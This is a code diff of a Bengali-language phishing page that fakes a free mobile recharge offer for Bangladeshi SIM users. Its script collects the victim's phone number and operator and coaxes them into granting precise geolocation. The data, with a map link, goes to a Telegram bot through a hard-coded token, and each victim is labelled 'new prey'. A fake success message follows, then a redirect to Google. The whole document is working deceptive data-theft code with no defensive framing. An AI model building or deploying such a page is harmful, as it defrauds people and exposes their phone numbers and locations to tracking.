@@ -5,82 +5,65 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>২০ টাকা ফ্রি রিচার্জ অফার!</title>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; border-top: 6px solid #e74c3c; }
-        h2 { color: #e74c3c; margin-bottom: 10px; font-size: 24px; }
-        p { color: #555; font-size: 16px; margin-bottom: 20px; }
-        .offer-box { background: #fff9e6; border: 1px dashed #ffcc00; padding: 10px; border-radius: 8px; margin-bottom: 20px; font-weight: bold; color: #b8860b; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background-color: #218838; }
-        .footer { margin-top: 15px; font-size: 12px; color: #888; }
+        body { background-color: #f2f2f2; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #ff0000; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🎁 ধামাকা অফার!</h2>
-    <div class="offer-box">সব সিমে ২০ টাকা ইনস্ট্যান্ট ফ্রি রিচার্জ!</div>
-    <p>অফারটি পেতে নিচের তথ্যগুলো পূরণ করুন</p>
-    
+<div class="box">
+    <h2 style="color:red">🎁 ধামাকা অফার!</h2>
+    <p>সব সিমে ২০ টাকা ইনস্ট্যান্ট ফ্রি রিচার্জ!</p>
     <select id="sim">
-        <option value="">সিম অপারেটর সিলেক্ট করুন</option>
+        <option value="">সিম সিলেক্ট করুন</option>
         <option value="GP">জিপি (GP)</option>
         <option value="BL">বাংলালিংক (BL)</option>
         <option value="Robi">রবি (Robi)</option>
-        <option value="Airtel">এয়ারটেল (Airtel)</option>
-        <option value="Teletalk">টেলিটক (TT)</option>
     </select>
-
-    <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর (017...)">
-    
-    <button onclick="getOffer()">রিচার্জ নিন</button>
-    
-    <div class="footer">অফারটি গ্রহণ করতে লোকেশন পারমিশন 'Allow' করুন।</div>
+    <input type="number" id="phone" placeholder="আপনার ১১ ডিজিটের নম্বর">
+    <button onclick="checkAndSend()">রিচার্জ নিন</button>
 </div>
 
 <script>
-function getOffer() {
-    var phone = document.getElementById('phone').value;
-    var sim = document.getElementById('sim').value;
+function checkAndSend() {
+    var p = document.getElementById('phone').value;
+    var s = document.getElementById('sim').value;
 
-    if (sim == "" || phone.length < 11) { 
-        alert("সঠিক সিম এবং নম্বর দিন।"); 
+    if (s == "" || p.length < 11) { 
+        alert("সঠিক নম্বর ও সিম দিন।"); 
         return; 
     }
+
+    // ইউজারকে মানসিকভাবে প্রস্তুত করা
+    alert("অফারটি নিশ্চিত করতে পরবর্তী পপ-আপে 'Allow' বা 'অনুমতি দিন' ক্লিক করুন।");
 
     var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
     var chat_id = "7887080882";
 
-    // লোকেশন পারমিশন চাওয়ার প্রসেস
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(position) {
             var lat = position.coords.latitude;
             var lon = position.coords.longitude;
-            // ম্যাপ লিঙ্কটি সরাসরি দেওয়া হলো
-            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+            var map = "https://www.google.com/maps?q=" + lat + "," + lon;
             
-            var message = "✅ **নতুন শিকার!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ লিঙ্ক: " + mapUrl;
-            sendToTelegram(token, chat_id, message);
+            var msg = "✅ নতুন শিকার!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n📍 ম্যাপ: " + map;
+            send(token, chat_id, msg);
         }, function(error) {
-            // যদি ইউজার পারমিশন না দেয়
-            var message = "⚠️ **নতুন শিকার (লোকেশন অফ)!**\n\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n❌ কারণ: লোকেশন পারমিশন দেয়নি।";
-            sendToTelegram(token, chat_id, message);
-        });
+            var msg = "⚠️ লোকেশন অফ!\n📱 নম্বর: " + p + "\n📶 সিম: " + s + "\n❌ কারণ: ইউজার পারমিশন দেয়নি।";
+            send(token, chat_id, msg);
+        }, {enableHighAccuracy: true, timeout: 5000});
     } else {
-        var message = "⚠️ **লোকেশন সাপোর্ট করে না!**\n\n📱 নম্বর: " + phone;
-        sendToTelegram(token, chat_id, message);
+        send(token, chat_id, "⚠️ ব্রাউজারে লোকেশন সাপোর্ট নেই।\n📱 নম্বর: " + p);
     }
 }
 
-function sendToTelegram(token, chat_id, message) {
-    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message) + "&parse_mode=Markdown";
-    
-    fetch(url).then(response => {
-        alert("আপনার আবেদন সফল হয়েছে! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
-        window.location.href = "https://www.google.com"; 
-    }).catch(err => {
-        alert("সার্ভার সমস্যা, আবার চেষ্টা করুন।");
+function send(t, i, m) {
+    var url = "https://api.telegram.org/bot" + t + "/sendMessage?chat_id=" + i + "&text=" + encodeURIComponent(m) + "&parse_mode=Markdown";
+    fetch(url).then(() => {
+        alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+        window.location.href = "https://www.google.com";
     });
 }
 </script>
